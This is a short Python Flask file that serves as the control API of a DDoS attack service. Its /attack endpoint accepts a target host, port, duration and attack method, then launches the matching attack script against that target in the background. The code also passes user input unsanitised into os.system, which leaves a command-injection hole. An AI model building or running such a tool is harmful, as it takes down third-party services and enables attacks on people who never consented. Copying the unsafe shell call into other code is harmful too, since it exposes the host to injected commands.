import os
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/')
def home():
    return "✅ DDoS Host API is Running!"

@app.route('/attack', methods=['POST'])
def attack():
    try:
        data = request.get_json()
        method = data.get('method')
        host = data.get('host')
        port = data.get('port')
        duration = data.get('duration')

        if not all([method, host, port, duration]):
            return jsonify({'error': 'Missing parameters'}), 400

        method_file = f"methods/{method}.py"
        if not os.path.exists(method_file):
            return jsonify({'error': f'Method {method} not found'}), 404

        command = f"python3 {method_file} {host} {port} {duration} &"
        os.system(command)
        return jsonify({'status': 'attack_started', 'host': host, 'port': port, 'duration': duration, 'method': method})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
app.run(host='0.0.0.0', port=port)
